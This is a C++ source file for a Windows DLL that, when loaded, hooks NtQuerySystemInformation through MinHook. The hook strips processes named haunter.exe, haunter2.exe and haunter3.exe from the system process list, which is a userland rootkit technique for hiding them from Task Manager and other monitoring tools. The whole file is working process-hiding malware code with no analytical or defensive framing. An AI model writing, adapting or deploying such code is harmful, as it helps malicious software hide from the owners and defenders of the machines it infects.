#include "config.hpp"

PNT_QUERY_SYSTEM_INFORMATION Original_NtQuerySystemInformation;
PNT_QUERY_SYSTEM_INFORMATION New_NtQuerySystemInformation;
wchar_t* process;

NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    NTSTATUS stat = New_NtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);

    if (SystemProcessInformation == SystemInformationClass && stat == 0)
    {
        P_SYSTEM_PROCESS_INFORMATION prev = P_SYSTEM_PROCESS_INFORMATION(SystemInformation);
        P_SYSTEM_PROCESS_INFORMATION curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);
        while (prev->NextEntryOffset != NULL) {
            if (!lstrcmp(curr->ImageName.Buffer, L"haunter.exe") || !lstrcmp(curr->ImageName.Buffer, L"haunter2.exe") || !lstrcmp(curr->ImageName.Buffer, L"haunter3.exe")) {
                if (curr->NextEntryOffset == 0) {
                    prev->NextEntryOffset = 0;
                }
                else {
                    prev->NextEntryOffset += curr->NextEntryOffset;
                }
                curr = prev;
            }
            prev = curr;
            curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
        }
    }

    return stat;
}



bool set_nt_hook()
{
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    
    Original_NtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");

    if (MH_Initialize() != MH_OK) { return false; }

    if (MH_CreateHook(Original_NtQuerySystemInformation, &Hooked_NtQuerySystemInformation,
        (LPVOID*)&New_NtQuerySystemInformation) != MH_OK) {
        return false;
    }

    if (MH_EnableHook(Original_NtQuerySystemInformation) != MH_OK) { return false; }

    return true;
}

// msg box
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{

    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        if (!set_nt_hook()) {
            return FALSE;
        }

        break;
    case DLL_PROCESS_DETACH:
        MH_DisableHook(Original_NtQuerySystemInformation);
        MH_Uninitialize();
        break;
    }

    return TRUE;
}
